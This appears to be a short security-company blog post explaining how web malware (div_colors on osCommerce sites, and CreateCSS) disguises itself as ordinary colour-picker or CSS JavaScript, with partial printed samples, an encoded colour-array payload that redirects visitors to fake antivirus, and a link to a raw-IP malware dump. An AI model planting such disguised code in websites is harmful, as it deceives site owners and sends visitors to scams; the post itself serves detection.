Malware week: The div_colors, CreateCSS and others

We are starting to see an interesting trend regarding how the latest web-based malware is being distributed. Instead of heavily encoding the malicious code on the infected web sites, attackers are now trying to make it look like legitimate code.
div_colors
For example, the div_colors malware that infected a lot of osCommerce sites, looks like a javascript color picker.  This is how it looks like in an infected site:

if (typeof(redef_colors)==”undefined”) {
var div_colors = new Array("#4b8272′, "#81787f’, ‘#832f83′, ‘#887f74′, ‘#4c3183′, ‘#748783′, ‘#3e7970′, ‘#857082′, ‘#728178′, ‘#7f8331′, ‘#2f8281′, ‘#724c31′, ‘#778383′, ‘#7f493e’, ‘#3e7a84′, ‘#82837e’, ‘#40403d’, ‘#727e7c’, ‘#3e7982′, ‘#3e7980′, ‘#847481′, ‘#883d7c’, ‘#787d3d’, ‘#7f777f’, "#314d00′);

The idea here is anyone looking for it may mistake it for a legitimate color picker script, or something non-malicious. In fact, in the osCommerce forums many people said it was non-malicious… Instead, the code redirects the site to a fake anti virus from multiple intermediaries:

CreateCSS
Another one that is confusing a lot of users is the CreateCSS malware. It looks like this in an infected site:

<script>function createCSS(selector,declaration)
{
var ua=navigator.userAgent.toLowerCase();
var isIE=(/msie/.test(ua))&&!(/opera/.test(ua))&&(/win/.te..

This is very easy to confuse with a CSS function or something like that (you can see the full malware dump here: http://193.105.240.93/data/97.txt).
An interesting shift regarding how the attackers are infecting web sites. But we will keep watching them 🙂

Site hacked? Infected with malware? Blacklisted? Yes, we clean up and monitor web sites.
